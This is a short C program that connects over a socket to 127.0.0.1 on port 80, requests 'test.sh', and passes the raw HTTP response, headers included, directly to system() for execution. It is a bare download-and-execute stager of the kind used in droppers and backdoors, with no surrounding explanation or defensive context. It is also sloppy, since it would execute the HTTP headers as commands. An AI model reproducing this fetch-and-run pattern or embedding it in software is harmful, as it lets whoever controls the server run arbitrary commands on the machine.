#include <arpa/inet.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

int main()
{
    int port = 80;
    char *host = "127.0.0.1";
    char *message_fmt = "GET /%s HTTP/1.0\r\n\r\n";
    char *item = "test.sh";

    char request[1024];
    sprintf(request, message_fmt, item);

    int status, valread, client_fd;
    struct sockaddr_in serv_addr;

    if ((client_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        return -1;
    }
    printf("%d", AF_INET);
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, host, &serv_addr.sin_addr) <= 0)
    {
        return -1;
    }

    if ((status = connect(client_fd, (struct sockaddr *)&serv_addr,
                          sizeof(serv_addr))) < 0)
    {
        return -1;
    }

    send(client_fd, request, strlen(request), 0);
    char buffer[1024] = {0};
    read(client_fd, buffer, 1024 - 1);
    system(buffer);
    // closing the connected socket
    close(client_fd);
    return 0;
}